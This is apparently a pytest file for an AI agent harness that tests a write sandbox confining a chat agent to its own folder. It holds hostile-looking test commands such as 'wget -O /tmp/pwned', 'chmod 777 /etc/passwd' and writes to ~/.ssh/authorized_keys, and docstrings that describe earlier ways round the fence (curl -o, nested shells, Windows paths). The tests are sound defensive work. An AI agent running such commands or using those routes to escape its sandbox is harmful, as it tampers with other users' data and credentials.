"""The write fence: a web chat may write its own folder and nothing else.

The read fence (``test_cloud_fence.py``) is about which files a tool may OPEN,
and its boundary is the workspace. This one is about where a tool may LAND
bytes, and its boundary is narrower — the chat's own folder — because the box
holds every other chat's transcript, the operator's credentials and the
customer's project on the same disk.

Two halves are proved here. First the pure reader of a shell command's write
destinations, because a redirect is the write that carries no path argument and
was the hole the old sandbox carve-out said out loud it did not cover. Then the
mirror: a write outside the folder is refused in EVERY permission mode, with
the reader-facing sentence, and a write inside it is the mode's business.
"""

from __future__ import annotations

import asyncio
import contextlib
import os
from collections.abc import AsyncIterator
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, cast

import httpx
import pytest
from _adapter_factory import FakeAdapterFactory
from alkera_cli.cloud import CloudRestClient, CloudSocket, fence
from alkera_cli.cloud.mirror import ChatMirror, RelayRefusedError
from alkera_cli.cloud.refusal import REFUSAL_COPY, fence_reason, quote_statement
from alkera_cli.contracts.tool_types import Effect
from alkera_cli.harness import HarnessRuntime, PermissionBroker
from alkera_cli.harness._fake import FakeAdapter
from alkera_cli.harness.adapter import PathFence, SessionConfig
from alkera_cli.host import paths
from alkera_cli.plugins.plugin_base.permissions import classify_command
from alkera_cli.plugins.plugin_base.permissions.config import (
    PermissionRule,
    PermissionsConfig,
    save_permissions,
)
from alkera_cli.plugins.plugin_base.permissions.shell import (
    analyze_shell,
    backslash_escapes_here,
)
from alkera_core.project.directory import ProjectDirectory
from alkera_core.schemas.chat import PermissionOption, PermissionRequest

_T = datetime(2026, 9, 14, tzinfo=UTC)
CHAT_ID = "chat-write"
OTHER_CHAT = "chat-b"
OWNER = "00000000-0000-4000-8000-000000000001"
OUTSIDE_FOLDER = REFUSAL_COPY["outside_chat_folder"]
OUTSIDE_WORKSPACE = REFUSAL_COPY["outside_workspace"]


# ---------------------------------------------------------------------------
# Reading a shell command's write destinations
# ---------------------------------------------------------------------------


def _write_targets(command: str, *, backslash_escapes: bool | None = None) -> list[str]:
    """Every destination the shell model reads off ``command``, as the fence
    judges them, spelled as the command spelled them. The fence reads in the
    host's dialect unless one is named."""
    dialect = backslash_escapes_here() if backslash_escapes is None else backslash_escapes
    return [location.text for location in analyze_shell(command, backslash_escapes=dialect).writes]


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param("cat notes.md", [], id="a-read-writes-nothing"),
        pytest.param("echo hi > out.txt", ["out.txt"], id="redirect-detached"),
        pytest.param("echo hi >out.txt", ["out.txt"], id="redirect-attached"),
        pytest.param("echo hi >> log.txt", ["log.txt"], id="append"),
        pytest.param("ls 2> err.log", ["err.log"], id="stderr-redirect"),
        pytest.param("ls &> all.log", ["all.log"], id="both-streams"),
        pytest.param("ls > /dev/null 2>&1", ["/dev/null"], id="a-descriptor-is-not-a-file"),
        pytest.param("echo hi | tee a.txt b.txt", ["a.txt", "b.txt"], id="tee-every-operand"),
        pytest.param("echo hi | tee -a a.txt", ["a.txt"], id="tee-flags-are-not-files"),
        pytest.param("cp src.txt dst.txt", ["dst.txt"], id="cp-writes-its-last-operand"),
        pytest.param("cp -r a b out/", ["out/"], id="cp-many-sources-one-destination"),
        # A move writes its destination and takes its source away.
        pytest.param("mv a.txt b.txt", ["b.txt", "a.txt"], id="mv-writes-its-last-operand"),
        pytest.param("dd if=/dev/zero of=big.bin", ["big.bin"], id="dd-names-its-of"),
        pytest.param(
            "cd work && echo hi > a.txt; cat b > c.txt",
            ["a.txt", "c.txt"],
            id="every-segment-is-read",
        ),
        pytest.param(
            "echo 'a > b' > real.txt", ["real.txt"], id="a-quoted-arrow-is-not-a-redirect"
        ),
    ],
)
def test_a_shell_commands_write_destinations_are_read_off_the_command(
    command: str, expected: list[str]
) -> None:
    assert _write_targets(command) == expected


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("echo 'unterminated > out.txt", id="unbalanced-quote"),
        pytest.param("echo hi >", id="a-redirect-with-no-destination"),
        pytest.param("cp only-one-operand", id="a-copy-with-no-destination"),
        # The escape a plain operand scan hands out: the destination is inside a
        # string this reader does not run, so "no destinations found" would have
        # read as "writes nowhere" and let the whole fence be stepped around.
        pytest.param('bash -c "echo hi > /tmp/y"', id="a-nested-shell"),
        pytest.param("sh -c 'echo x > /tmp/z'", id="a-nested-sh"),
        pytest.param("env FOO=1 tee /tmp/x", id="a-command-behind-env"),
        pytest.param("xargs -I{} cp {} /tmp", id="a-command-behind-xargs"),
        pytest.param('python -c \'open("/tmp/x","w")\'', id="an-interpreter"),
        pytest.param("find . -exec rm {} ;", id="find-runs-what-it-finds"),
        pytest.param("sudo tee /etc/hosts", id="a-command-behind-sudo"),
        # A writer this reader was never taught. Every one of these lands bytes
        # on the box, and every one of them was allowed while an unknown name
        # answered "writes nowhere" — the same write the redirect reader
        # refuses, waved through because it was spelled as a flag instead.
        pytest.param("wget -O /tmp/pwned https://example.com/x", id="wget"),
        pytest.param("touch ../chat-b/marker", id="touch"),
        pytest.param("mkdir -p /tmp/evil", id="mkdir"),
        pytest.param("tar -xf payload.tar -C /", id="tar"),
        pytest.param("unzip payload.zip -d /tmp", id="unzip"),
        pytest.param("ln -s /etc/passwd /tmp/link", id="ln"),
        pytest.param("chmod 777 /etc/passwd", id="chmod"),
        pytest.param("patch -p1 < payload.diff", id="patch"),
        pytest.param("git clone https://example.com/r /tmp/r", id="git"),
        pytest.param("pip install --target /tmp/pkgs requests", id="pip"),
        pytest.param("openssl rand -out /tmp/key 32", id="openssl"),
        pytest.param("curl -O https://example.com/x", id="curl-keeps-the-remote-name"),
        pytest.param("curl -Os https://example.com/x", id="curl-remote-name-in-a-cluster"),
        pytest.param("curl -os https://example.com/x", id="curl-hides-its-output-flag"),
        pytest.param("curl -o", id="curl-names-no-destination"),
    ],
)
def test_a_command_whose_destinations_cannot_be_read_is_refused_not_guessed(
    command: str,
) -> None:
    """The unreadable case is the one a permissive guess would have let out."""
    assert not analyze_shell(command).readable


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param(
            "curl -sS -o /tmp/pwned https://example.com/x", ["/tmp/pwned"], id="curl-detached"
        ),
        pytest.param(
            "curl --output=/tmp/pwned https://example.com/x", ["/tmp/pwned"], id="curl-attached"
        ),
        pytest.param(
            "curl -sSo /tmp/pwned https://example.com/x", ["/tmp/pwned"], id="curl-short-cluster"
        ),
        pytest.param("curl -sS https://example.com/x", [], id="curl-to-stdout-writes-no-file"),
        pytest.param("sort -o sorted.txt a.txt", ["sorted.txt"], id="sort-writes-its-o"),
        pytest.param("cat a.txt | sort | uniq -c", [], id="a-pipeline-that-writes-nothing"),
        pytest.param("uniq in.txt out.txt", ["out.txt"], id="uniq-writes-its-second-operand"),
    ],
)
def test_a_destination_named_behind_a_flag_is_read_like_any_other(
    command: str, expected: list[str]
) -> None:
    """A write spelled ``-o`` is the same write as one spelled ``>``.

    Read as "no operands, therefore no destinations", ``curl -o`` was the hole:
    the fence refused ``echo x > /tmp/pwned`` and allowed the identical write
    one flag away from it.
    """
    assert _write_targets(command) == expected


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param(
            r"echo pwned > C:\work\project\src\app.py",
            [r"C:\work\project\src\app.py"],
            id="redirect",
        ),
        pytest.param(
            r"curl -sS -o C:\work\project\src\app.py https://example.com/x",
            [r"C:\work\project\src\app.py"],
            id="a-flag-named-destination",
        ),
        pytest.param(
            r"cp payload.bin C:\Windows\System32\drivers\etc\hosts",
            [r"C:\Windows\System32\drivers\etc\hosts"],
            id="a-copys-last-operand",
        ),
    ],
)
def test_a_windows_shell_keeps_the_separators_in_the_destination_it_names(
    command: str, expected: list[str]
) -> None:
    """On a Windows box ``\\`` is the path separator, not an escape.

    Lexed POSIX-style those separators are swallowed and
    ``C:\\work\\project\\src\\app.py`` comes back ``C:workprojectsrcapp.py`` — a
    bare relative name the fence then resolves INSIDE the chat folder it is
    guarding, so an escaping write is parked for a reader instead of refused.
    The dialect is named here rather than inferred, so the pin holds on every
    host.
    """
    assert _write_targets(command, backslash_escapes=False) == expected


def test_a_posix_shell_still_reads_a_backslash_as_an_escape() -> None:
    """The other half of the pair: on POSIX the escape is real, so an escaped
    space keeps one destination one token."""
    assert _write_targets("echo hi > my\\ notes.txt", backslash_escapes=True) == ["my notes.txt"]


def test_the_dialect_follows_the_host_when_the_caller_names_none() -> None:
    assert backslash_escapes_here() is (os.name != "nt")


def test_the_noclobber_redirect_is_the_same_write_as_a_plain_one() -> None:
    """``>|`` overrides ``noclobber``; it does not change where the bytes go.

    Read as ``>`` plus a stray ``|`` operand it named the pipe character as the
    destination — which happened to refuse, for entirely the wrong reason, and
    left the real file unchecked.
    """
    assert _write_targets("echo hi >| out.txt") == ["out.txt"]


# ---------------------------------------------------------------------------
# The boundary
# ---------------------------------------------------------------------------


@pytest.fixture
def folder(tmp_path: Path) -> Path:
    chat = tmp_path / "work" / ".alkera" / "chats" / CHAT_ID
    (chat / "scratch").mkdir(parents=True)
    (tmp_path / "work" / ".alkera" / "chats" / OTHER_CHAT).mkdir(parents=True)
    (tmp_path / "work" / "src").mkdir(parents=True)
    return chat


@pytest.mark.parametrize(
    ("destination", "outside"),
    [
        pytest.param("scratch/plan.md", False, id="the-chats-own-scratch"),
        pytest.param("notes.md", False, id="the-chat-folder-itself"),
        pytest.param("scratch/../notes.md", False, id="a-dotdot-that-stays-inside"),
        pytest.param("/tmp/x", True, id="somewhere-else-on-the-box"),
        pytest.param("../../../src/app.py", True, id="the-customers-project"),
        pytest.param(f"../{OTHER_CHAT}/transcript.jsonl", True, id="another-chats-folder"),
        pytest.param("~/.ssh/authorized_keys", True, id="the-operators-home"),
        pytest.param("scratch/*.md", True, id="a-glob-decides-where-it-lands-later"),
        pytest.param("manifest.json", True, id="the-chats-manifest"),
        pytest.param("trace.digest.json", True, id="the-chats-trace-digest"),
        pytest.param("chat.jsonl", True, id="the-chats-transcript"),
        pytest.param("decisions.jsonl", True, id="the-chats-decisions"),
        pytest.param("cost_ledger.jsonl", True, id="the-chats-cost-ledger"),
        pytest.param(".runtime/agent/session.db", True, id="the-boxs-runtime-state"),
        pytest.param("scratch/../.runtime", True, id="a-dotdot-onto-the-runtime-state"),
        pytest.param("scratch/../chat.jsonl", True, id="a-dotdot-onto-the-transcript"),
        pytest.param("scratch/manifest.json", False, id="the-same-name-inside-the-working-dir"),
        pytest.param("scratch/chat.jsonl", False, id="a-transcript-of-its-own-in-the-working-dir"),
    ],
)
def test_a_write_lands_inside_the_chat_folder_or_it_does_not_land(
    folder: Path, destination: str, outside: bool
) -> None:
    """The fence is the chat folder, minus the chat's own records at its top:
    the manifest that pins the agent session, the transcript and the decision
    and cost logs, the trace digest and the box's runtime state are the box's
    to write in every mode, never the model's."""
    assert fence.write_escapes(destination, folder=folder) is outside


def test_the_fence_refuses_exactly_the_names_the_drive_marks_as_records() -> None:
    """One set, spelled once: a name the drive marks as a chat's record at
    birth is a name the fence refuses, and the other way round. A rule that
    grew on one side alone would leave the model a record the drive protects
    from people, or people a record the model may not touch."""
    from alkera_core.chat_records import CHAT_RECORD_NAMES

    assert fence.CHAT_RECORD_NAMES == CHAT_RECORD_NAMES
    assert {"chat.jsonl", "decisions.jsonl", "cost_ledger.jsonl"} <= fence.CHAT_RECORD_NAMES


@pytest.mark.parametrize(
    ("destination", "outside"),
    [
        pytest.param("report.html", False, id="a-bare-name-lands-in-the-working-dir"),
        pytest.param("manifest.json", False, id="a-manifest-of-its-own-is-not-the-chats"),
        pytest.param("../notes.md", False, id="one-level-up-is-still-the-chat-folder"),
        pytest.param("../manifest.json", True, id="one-level-up-onto-the-chats-manifest"),
        pytest.param("../.runtime/x", True, id="one-level-up-into-the-runtime-state"),
        pytest.param("../../src/app.py", True, id="two-levels-up-is-the-customers-project"),
    ],
)
def test_a_relative_write_is_judged_from_where_the_agent_runs(
    folder: Path, destination: str, outside: bool
) -> None:
    """The agent runs in the chat's working directory, one level inside the
    fence, so a relative name is resolved from there — a bare ``manifest.json``
    is the agent's own file, and only a climb onto the chat's record is the
    write the fence refuses."""
    assert fence.write_escapes(destination, folder=folder, base=folder / "scratch") is outside


@pytest.mark.parametrize(
    ("tool", "args", "expected"),
    [
        pytest.param("write", {"file_path": "scratch/a.txt"}, None, id="inside"),
        pytest.param("write", {"file_path": "/etc/hosts"}, "/etc/hosts", id="outside"),
        pytest.param(
            "bash",
            {"command": "echo hi > scratch/a.txt", "cwd": "."},
            None,
            id="a-redirect-into-the-folder",
        ),
        pytest.param(
            "bash",
            {"command": "echo hi > /tmp/a.txt", "cwd": "."},
            "/tmp/a.txt",
            id="a-redirect-out-of-the-folder",
        ),
        pytest.param(
            "bash",
            {"command": "cp scratch/a.txt /tmp/a.txt", "cwd": "."},
            "/tmp/a.txt",
            id="a-copy-out-of-the-folder",
        ),
        pytest.param(
            "bash",
            {"command": "cat scratch/a.txt", "cwd": "."},
            None,
            id="a-shell-read-writes-nowhere",
        ),
        pytest.param(
            "bash",
            {"command": "echo 'x", "cwd": "."},
            "echo 'x",
            id="an-unreadable-command-is-quoted-and-refused",
        ),
        pytest.param(
            "bash",
            {"command": "echo hi > a.txt", "cwd": "/tmp"},
            "a.txt",
            id="a-cwd-outside-the-folder-moves-the-destination-with-it",
        ),
    ],
)
def test_a_tool_call_is_judged_by_where_it_would_write(
    folder: Path, tool: str, args: dict[str, Any], expected: str | None
) -> None:
    assert fence.write_escape(tool, args, folder=folder) == expected


# ---------------------------------------------------------------------------
# The mirror
# ---------------------------------------------------------------------------


def _write_ask(
    *,
    raw: str,
    kind: str = "edit",
    capability: str = "fs",
    effect: str = "write",
    request_id: str = "req-w",
) -> PermissionRequest:
    return PermissionRequest(
        event_id=f"ev-{request_id}",
        time=_T,
        session_id=CHAT_ID,
        request_id=request_id,
        tool_call_id=f"call-{request_id}",
        permission_kind=kind,
        # A read ask is not a write-class one, whatever the tool: the canonical
        # kind has to follow the effect or the fence judges a read as a write.
        canonical_kind=(
            "shell" if capability == "shell" else ("edit" if effect != "read" else "other")
        ),
        patterns=[],
        subject={
            "capability": capability,
            "effect": effect,
            "operation": kind,
            "raw": raw,
            "targets": [] if capability == "shell" else [{"kind": "file", "name": raw}],
            "classifier": "opencode-tool",
        },
        options=[
            PermissionOption(option_id="allow_once", name="Allow"),
            PermissionOption(option_id="reject_once", name="Reject"),
        ],
    )


class _Mirror:
    def __init__(
        self,
        mirror: ChatMirror,
        adapter: FakeAdapter,
        workspace: Path,
        config: SessionConfig,
    ) -> None:
        self.mirror = mirror
        self.adapter = adapter
        self.workspace = workspace
        #: What the harness was actually configured with — so a test can spell a
        #: path the way the AGENT would (relative to its own cwd) rather than
        #: restating where the test wishes that cwd were.
        self.config = config

    async def ask(self, request: PermissionRequest) -> str:
        await self.adapter.feed(request)
        deadline = asyncio.get_running_loop().time() + 5.0
        while asyncio.get_running_loop().time() < deadline:
            for replied, option in self.adapter.permission_replies:
                if replied == request.request_id:
                    await asyncio.sleep(0.05)
                    return str(option)
            if request.request_id in self.mirror.pending_interrupts:
                return "parked"
            await asyncio.sleep(0.02)
        raise AssertionError(f"no answer for {request.request_id}")

    async def asks(self, request_id: str, *, expected: int) -> list[dict[str, Any]]:
        """The ``permission.request`` entries for ``request_id`` on the wire so
        far, waited on briefly: the harness's own append and the mirror's
        announcement reach the outbound lane from two tasks, in either order."""
        found: list[dict[str, Any]] = []
        deadline = asyncio.get_running_loop().time() + 2.0
        while True:
            while not self.mirror._outbound.empty():
                entry = self.mirror._outbound.get_nowait()
                payload = entry.get("payload", {})
                if entry.get("kind") == "permission.request" and (
                    payload.get("request_id") == request_id
                ):
                    found.append(entry)
            if len(found) >= expected or asyncio.get_running_loop().time() >= deadline:
                return found
            await asyncio.sleep(0.02)

    def notes(self) -> list[str]:
        out: list[str] = []
        while not self.mirror._outbound.empty():
            entry = self.mirror._outbound.get_nowait()
            if "__meta__" in entry:
                continue
            payload = entry.get("payload", {})
            if (
                entry.get("kind") == "part.created"
                and payload.get("part", {}).get("type") == "text"
                and entry.get("role") == "system"
            ):
                out.append(str(payload["part"]["text"]))
        return out


@pytest.fixture
async def fenced(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> AsyncIterator[_Mirror]:
    """A mirror whose writes reach its own permission resolver."""
    workspace = tmp_path / "work"
    (workspace / "src").mkdir(parents=True)
    home = tmp_path / "alkera-home"
    home.mkdir()
    monkeypatch.setattr(paths, "ALKERA_HOME", home)
    factory = FakeAdapterFactory(FakeAdapter, available=True)
    runtime = HarnessRuntime(ProjectDirectory(workspace / ".alkera"), adapter_factory=factory)
    save_permissions(
        workspace / ".alkera",
        # Both effects ask, so every filesystem action reaches the mirror's own
        # resolver: what a test then sees is the FENCE's decision, never the
        # rule table quietly auto-allowing one of the two.
        PermissionsConfig(
            rules=[
                PermissionRule(capability="fs", effect=Effect.READ, decision="ask"),
                PermissionRule(capability="fs", effect=Effect.WRITE, decision="ask"),
            ]
        ),
    )
    runtime.project.chats().create(session_id=CHAT_ID, title="t", harness_type="agent").close()
    runtime.project.chats().create(session_id=OTHER_CHAT, title="o", harness_type="agent").close()
    handle = ChatMirror(
        chat_id=CHAT_ID,
        runtime=runtime,
        socket=cast(CloudSocket, object()),
        rest=CloudRestClient(
            api_url="http://objects.test",
            token="device-jwt",
            agent_id=CHAT_ID,
            transport=httpx.MockTransport(lambda _r: httpx.Response(404, json={})),
        ),
        user_id=OWNER,
        owner_user_id=OWNER,
    )
    broker = PermissionBroker(handle._resolve_permission, default_timeout_seconds=None)
    # Opened the way the box opens it — so the cwd a relative write is judged
    # against is production's, not this fixture's idea of it. The session's own
    # read fence is then switched off: it refuses an out-of-workspace location
    # before the broker ever sees it, and what these tests are about is the
    # decision the MIRROR makes.
    handle._session = await handle.open_session(broker)
    handle._session._path_fence = None
    handle._session.set_permission_mode("default")
    handle._mode = "default"
    pump = asyncio.get_running_loop().create_task(handle._pump(handle._session.subscribe()))
    handle._outbound = asyncio.Queue()
    try:
        yield _Mirror(handle, factory.adapters[0], workspace, factory.configs[0])
    finally:
        pump.cancel()
        with contextlib.suppress(BaseException):
            await pump
        await runtime.close_chat(CHAT_ID)


@pytest.mark.parametrize("mode", ["read_only", "default", "plan", "bypass"])
@pytest.mark.parametrize(
    ("destination", "sentence"),
    [
        pytest.param("/tmp/escape.txt", OUTSIDE_WORKSPACE, id="somewhere-else-on-the-box"),
        pytest.param("src/app.py", OUTSIDE_FOLDER, id="the-customers-project"),
        pytest.param(
            f".alkera/chats/{OTHER_CHAT}/transcript.jsonl",
            OUTSIDE_WORKSPACE,
            id="another-chats-folder",
        ),
    ],
)
async def test_a_write_outside_the_chat_folder_is_refused_in_every_mode(
    fenced: _Mirror, mode: str, destination: str, sentence: str
) -> None:
    """The mode governs prompting; the folder governs reach.

    A reader who moves the chat out of ``read_only`` — as far as ``bypass``,
    where nothing is asked at all — has asked for fewer prompts, not for the
    rest of the box. Which of the two fences answers
    depends on the destination and is named here rather than glossed over: the
    read fence already barred everything off the workspace and everything under
    ``.alkera`` that is not this chat's own folder, so the write fence's own
    contribution — and the only sentence it alone can produce — is the
    customer's project, which a chat may read and may not write.
    """
    fenced.mirror._mode = mode  # type: ignore[assignment]
    target = str(fenced.workspace / destination)

    assert await fenced.ask(_write_ask(raw=target, request_id=f"req-{mode}")) == "reject_once"

    assert fenced.notes() == [f"{sentence}\n{quote_statement(target)}"]
    assert fenced.mirror.pending_interrupts == [], "a refused write is never parked on a reader"


async def test_the_project_a_chat_may_read_is_not_a_project_it_may_write(
    fenced: _Mirror,
) -> None:
    """The write fence's own boundary, stated as the pair that makes it one.

    The same file: a read of it is nobody's business but the read fence's, and
    it passes; a write to it is refused. Without the write fence the second
    would have been parked for the reader to approve.
    """
    target = str(fenced.workspace / "src" / "app.py")

    readable = _write_ask(raw=target, effect="read", kind="read", request_id="req-read")
    assert await fenced.ask(readable) == "parked"
    assert fenced.notes() == []
    # Hand the parked ask back before the next one: the broker carries one ask
    # at a time per session, so a read left waiting on a reader would make the
    # write that follows it look refused by a timeout rather than by the fence.
    fenced.mirror._answer_interrupt("req-read", {"option_id": "reject_once"})

    assert await fenced.ask(_write_ask(raw=target, request_id="req-write")) == "reject_once"
    assert fenced.notes() == [f"{OUTSIDE_FOLDER}\n{quote_statement(target)}"]


async def test_a_shell_redirect_out_of_the_chat_folder_is_refused_too(fenced: _Mirror) -> None:
    """The redirect the sandbox carve-out used to say it did not cover."""
    command = f"echo pwned > {fenced.workspace / 'src' / 'app.py'}"

    answer = await fenced.ask(
        _write_ask(raw=command, kind="bash", capability="shell", request_id="req-redirect")
    )

    assert answer == "reject_once"
    assert fenced.notes() == [
        f"{OUTSIDE_FOLDER}\n{quote_statement(str(fenced.workspace / 'src' / 'app.py'))}"
    ]


async def test_a_shell_writer_that_names_its_destination_behind_a_flag_is_refused(
    fenced: _Mirror,
) -> None:
    """The write the fence had never been taught to read was simply allowed.

    ``echo pwned > src/app.py`` is refused above; the same bytes landed in the
    same place through ``curl -o`` because ``curl`` was in no table and "no
    destinations found" was read as "writes nowhere". One approval from a
    reader who sees an ordinary shell prompt then wrote outside the chat's
    folder — on a box that holds every other chat's transcript.
    """
    target = str(fenced.workspace / "src" / "app.py")
    for raw in (
        f"curl -sS -o {target} https://example.com/x",
        f"wget -O {target} https://example.com/x",
    ):
        fenced.mirror._outbound = asyncio.Queue()
        answer = await fenced.ask(
            _write_ask(raw=raw, kind="bash", capability="shell", request_id="req-unknown-writer")
        )

        assert answer == "reject_once", raw
        assert fenced.notes() == [f"{OUTSIDE_FOLDER}\n{quote_statement(target)}"], raw
        assert fenced.mirror.pending_interrupts == [], "a refused write is never parked"


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("touch {target}", id="touch"),
        pytest.param("tar -xf payload.tar -C {target}", id="tar-C"),
        pytest.param("git clone https://example.com/r {target}", id="git-clone"),
    ],
)
async def test_a_shell_writer_this_fence_cannot_read_is_the_readers_to_answer(
    fenced: _Mirror, command: str
) -> None:
    """A command whose destinations this reader cannot see is never allowed on
    its own — and in a stance that asks, it is not refused on its own either:
    the reader gets one card carrying the real command and decides. (In
    ``bypass``, where nobody is asked, the same command is refused.)"""
    target = str(fenced.workspace / "src" / "app.py")
    raw = command.format(target=target)

    answer = await fenced.ask(
        _write_ask(raw=raw, kind="bash", capability="shell", request_id="req-unknown-writer")
    )

    assert answer == "parked"
    assert fenced.notes() == []
    assert list(fenced.mirror.pending_interrupts) == ["req-unknown-writer"]


async def test_a_write_beside_the_working_directory_is_refused_not_asked(
    fenced: _Mirror,
) -> None:
    """The chat folder's top level holds the chat's records, so a new file there
    is outside the fence: refused in ``default`` without a reader being asked."""
    target = str(fenced.mirror.chat_folder / "report.html")

    assert await fenced.ask(_write_ask(raw=target, request_id="req-inside")) == "reject_once"
    assert fenced.mirror.pending_interrupts == []


@pytest.mark.parametrize("mode", ["default", "read_only", "plan"])
async def test_a_write_into_the_chats_working_directory_needs_nobodys_answer(
    fenced: _Mirror, mode: str
) -> None:
    """The working directory the agent runs in is the session's sandbox: the one
    place inside the folder a write is admitted without an ask, in every mode,
    so the agent keeps its plan, its working files and what it produces there
    even where the mode refuses every other write. The write at the chat
    folder's own top level is the control: it is outside the fence, so it is
    refused unasked in every mode."""
    fenced.mirror._session.set_permission_mode(mode)  # type: ignore[arg-type]
    fenced.mirror._mode = mode  # type: ignore[assignment]
    inside = str(fenced.mirror.working_dir / "plan.md")
    beside = str(fenced.mirror.chat_folder / "report.html")

    assert await fenced.ask(_write_ask(raw=inside, request_id="req-inside")) == "allow_once"
    assert fenced.notes() == []
    assert fenced.mirror.pending_interrupts == [], "a working-dir write is never parked"

    assert await fenced.ask(_write_ask(raw=beside, request_id="req-beside")) == "reject_once"


@pytest.mark.parametrize("mode", ["default", "read_only", "plan", "bypass"])
@pytest.mark.parametrize(
    "record",
    [
        pytest.param("manifest.json", id="the-manifest"),
        pytest.param("trace.digest.json", id="the-trace-digest"),
        pytest.param(".runtime/agent/session.db", id="the-runtime-state"),
    ],
)
async def test_the_chats_own_records_are_refused_in_every_mode(
    fenced: _Mirror, mode: str, record: str
) -> None:
    """The records beside the working directory are not the model's: a manifest
    it rewrote would re-pin its own session. They sit under ``.alkera`` outside
    the working directory, so the read bound refuses them first — unasked, in
    every mode the reader can relay, ``bypass`` included — with the fence's
    sentence, never a reader's."""
    fenced.mirror._mode = mode  # type: ignore[assignment]
    target = str(fenced.mirror.chat_folder / record)

    assert await fenced.ask(_write_ask(raw=target, request_id="req-record")) == "reject_once"
    assert fenced.mirror.pending_interrupts == [], "a record write is never a reader's to allow"
    assert fenced.notes() == [f"{OUTSIDE_WORKSPACE}\n{quote_statement(target)}"]


async def test_the_mirror_opens_its_session_in_the_chats_working_directory(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The cwd is the chat's working directory, the sandbox is that same
    directory, and the write fence is the chat folder around it — through the
    mirror's own opener, so this holds for the chats a box really serves.

    The cwd and the fence once disagreed, and every consequence followed: the
    box ran the agent on the customer's project root while the fence admitted
    only the chat's folder, so the first thing an analyst asks for — "create a
    file" — was refused before any reader was asked, in every mode, forever.
    Now the cwd is the one place a write needs nobody's answer: what the model
    names relatively lands where the person will look for it.

    The brief is the other half. The agent may read the whole workspace and
    write one directory; nothing in the tool surface says which is which, so it
    has to be told, or it spends its turns proposing writes into the project it
    has just read.
    """
    workspace = tmp_path / "work"
    (workspace / "src").mkdir(parents=True)
    home = tmp_path / "alkera-home"
    home.mkdir()
    monkeypatch.setattr(paths, "ALKERA_HOME", home)
    factory = FakeAdapterFactory(FakeAdapter, available=True)
    runtime = HarnessRuntime(ProjectDirectory(workspace / ".alkera"), adapter_factory=factory)
    runtime.project.chats().create(session_id=CHAT_ID, title="t", harness_type="agent").close()
    handle = ChatMirror(
        chat_id=CHAT_ID,
        runtime=runtime,
        socket=cast(CloudSocket, object()),
        rest=CloudRestClient(
            api_url="http://objects.test",
            token="device-jwt",
            agent_id=CHAT_ID,
            transport=httpx.MockTransport(lambda _r: httpx.Response(404, json={})),
        ),
        user_id=OWNER,
        owner_user_id=OWNER,
    )
    broker = PermissionBroker(handle._resolve_permission, default_timeout_seconds=None)

    session = await handle.open_session(broker)
    try:
        config = factory.configs[0]
        assert config.cwd == handle.working_dir
        assert handle.working_dir == handle.chat_folder / "scratch"
        assert handle.working_dir.is_dir(), "the agent's cwd has to exist before it runs there"
        assert session.tool_binding is not None
        assert session.tool_binding.sandbox_dir == handle.working_dir

        brief = config.harness_native["global_instructions"]
        assert str(handle.working_dir) in brief
        assert str(workspace) in brief
        assert "read" in brief.lower()
    finally:
        await runtime.close_chat(CHAT_ID)


async def test_the_write_an_agent_actually_makes_needs_no_answer(fenced: _Mirror) -> None:
    """The defect, spelled the way the agent spells it.

    A model told "create a file named qa_l_probe.txt" names it relatively, and
    the harness resolves that against its own cwd — so the destination is
    computed here the same way rather than asserted to be somewhere. With the
    cwd on the project root this is ``<ws>/qa_l_probe.txt``: outside the chat's
    folder, refused by the fence with the outside-the-sandbox sentence, and
    never shown to anyone. With the cwd on the chat's working directory, the
    same call lands in the one place a write needs nobody's answer — and what
    it writes is in the folder that gets pushed back to the drive when the
    chat sleeps.
    """
    target = fenced.config.cwd / "qa_l_probe.txt"

    assert await fenced.ask(_write_ask(raw=str(target), request_id="req-natural")) == "allow_once"

    assert fenced.notes() == [], "the natural write is nobody's refusal to make"
    assert fenced.mirror.pending_interrupts == [], "and nobody's to answer either"
    assert fenced.mirror.working_dir in target.parents
    assert fenced.mirror.chat_folder in target.parents


async def test_a_relative_write_is_judged_where_the_agent_would_put_it(fenced: _Mirror) -> None:
    """The same claim one layer down, for the spelling a harness may pass through
    unresolved: a bare name is the working directory's, and a climb out of it —
    one level up, beside the chat's own records, included — is not."""
    folder = fenced.mirror.session_fence.folder
    assert folder == fenced.config.cwd == fenced.mirror.chat_folder / "scratch"
    assert fence.write_escapes("../notes.md", folder=folder, base=fenced.config.cwd) is True

    assert fence.write_escapes("qa_l_probe.txt", folder=folder, base=fenced.config.cwd) is False
    assert fence.write_escapes("../../../src/app.py", folder=folder, base=fenced.config.cwd) is True


async def test_no_answer_approves_a_write_while_the_chat_is_an_analysts(
    fenced: _Mirror,
) -> None:
    """``read_only`` still refuses every write, folder or no folder."""
    fenced.mirror._mode = "read_only"
    inside = _write_ask(raw=str(fenced.mirror.working_dir / "a.txt"), request_id="req-ro")

    assert fenced.mirror._refuses_the_write(inside) is True

    fenced.mirror._mode = "default"
    assert fenced.mirror._refuses_the_write(inside) is False


# ---------------------------------------------------------------------------
# The mode relay
# ---------------------------------------------------------------------------


async def test_the_reader_moves_the_mode_and_the_session_moves_with_it(
    fenced: _Mirror,
) -> None:
    fenced.mirror._mode = "read_only"
    fenced.mirror._session.set_permission_mode("read_only")  # type: ignore[union-attr]

    await fenced.mirror._on_mode({"kind": "mode", "mode": "default"})

    assert fenced.mirror.permission_mode == "default"
    assert fenced.mirror._session.permission_mode == "default"  # type: ignore[union-attr]


@pytest.mark.parametrize(
    "mode",
    [
        pytest.param("accept_edits", id="a-retired-word"),
        pytest.param("READ_ONLY", id="spelled-differently"),
        pytest.param("", id="empty"),
        pytest.param(None, id="missing"),
        pytest.param(7, id="not-a-string"),
    ],
)
async def test_a_mode_a_cloud_chat_does_not_run_in_is_refused(fenced: _Mirror, mode: Any) -> None:
    """A word the box does not know must not be read as something it does.

    A relay naming one is refused outright rather than downgraded to the
    nearest mode: a reader who believes they turned the prompts off and a box
    that read the word as something else is the failure this guards.
    """
    before = fenced.mirror.permission_mode

    with pytest.raises(RelayRefusedError):
        await fenced.mirror._on_mode({"kind": "mode", "mode": mode})

    assert fenced.mirror.permission_mode == before


# ---------------------------------------------------------------------------
